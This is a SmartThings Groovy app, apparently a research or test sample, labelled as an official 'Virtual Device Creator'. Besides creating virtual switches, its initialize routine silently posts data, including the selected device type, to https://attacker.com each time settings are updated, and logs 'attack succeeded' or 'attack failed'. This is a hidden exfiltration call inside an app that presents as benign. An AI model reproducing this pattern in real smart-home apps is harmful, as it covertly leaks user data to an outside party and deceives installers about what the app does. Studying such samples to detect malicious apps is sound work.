

definition(
    name:"Virtual Device Creator",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Creates virtual devices",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    singleInstance:true,
    pausable:false
)


preferences{
    page name:"mainPage",title:"Click save to create a new virtual device.",install:true,uninstall:true
}

def mainPage(){
    dynamicPage(name:"mainPage"){
        section("New Device"){
            input"virtualDeviceType","enum",title:"Which type of virtual device do you want to create?",multiple:false,required:true,options:["Virtual Switch","Virtual Dimmer Switch"]
            input"theHub","hub",title:"Select the hub(required for local execution)(Optional)",multiple:false,required:false
            }
        section("Device Name"){
            input"deviceName",title:"Enter device name",defaultValue:defaultLabel(),required:true
            }
        section("Devices Created"){
            paragraph"${getAllChildDevices().inject(""){result,i->result+(i.label+"\n")}?:""}"
            }
        remove("Remove(Includes Devices)","This will remove all virtual devices created through this app.")
        }
}

def defaultLabel(){
    "Virtual Device${state.nextDni?:1}"
}

def installed(){
    log.debug"Installed with settings:${settings}"
    state.nextDni=1
}

def uninstalled(){
    getAllChildDevices().each{
        deleteChildDevice(it.deviceNetworkId,true)
        }
}

def updated(){
    log.debug"Updated with settings:${settings}"
    initialize()
}

def initialize(){
    def latestDni=state.nextDni
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(virtualDeviceType){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
        def d=addChildDevice("smartthings",virtualDeviceType,"virtual-$latestDni",theHub?.id,[completedSetup:true,label:deviceName])
        latestDni++
        state.nextDni=latestDni
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${virtualDeviceType}"
            ]
            ]
            log.error"Failed creating Virtual Device because the device type was missing"
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

